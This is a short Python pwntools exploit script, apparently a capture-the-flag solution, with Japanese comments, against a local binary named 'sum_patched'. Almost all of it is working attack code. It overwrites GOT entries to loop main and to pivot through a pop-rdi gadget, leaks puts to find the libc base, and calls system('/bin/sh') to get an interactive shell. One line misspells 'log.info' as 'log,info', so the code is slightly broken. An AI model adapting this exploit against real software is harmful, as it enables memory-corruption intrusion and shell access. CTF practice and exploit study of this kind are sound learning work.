#!/usr/bin/env python3

from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./sum_patched")
gdb.attach(target, gdbscript="b sum")
elf = ELF("sum_patched")

print(target.recvuntil("2 3 4 0\n"))

def write(content, address):
    foo = content - (address + 4)
    send = "1 1 1 1 {} {} 0".format(foo, address)
    target.send(send)

log.info("1,exitのgotにmainアドレスを書き込みループさせる")
write(0x400903, 0x601048)
print(target.recvuntil("2 3 4 0\n"))

"""
printf呼び出し前のスタックにはscanfで書き込んだ値がある
つまりprintfがcallされたときにpop retしてやればそのままropできる
"""
log.info("2,printfのgotにpopガジェットを書き込む.")
poprdi = 0x400a43
write(poprdi, elf.got["printf"])
print(target.recvuntil("2 3 4 0\n"))

log.info("3,printf上のスタックにputsをリークさせるropを書く")
send = "{} {} {} {} 0".format(poprdi, elf.got["puts"], elf.symbols["puts"], 0x4009a7)
target.sendline(send)

log,info("4,putsのアドレスがリークされる.putsからオフセットを引いてbaseを割り出す.")
leak_puts = u64(target.recv(6) + b"\x00" * 2)
base = leak_puts - elf.symbols["puts"] 
print("puts: ", hex(leak_puts))
print("base: ", hex(base))

print(target.recvuntil("2 3 4 0\n"))

""" 
symbols["system"]は無理だったのでp systemしてオフセットを算出した
"""
log.info("5,libc内の/bin/shとsystemを利用してROPを組む")
payload = "{} {} {} 0".format(poprdi, base + 0x533ada, base + 0x3cf080)
target.sendline(payload)

target.interactive()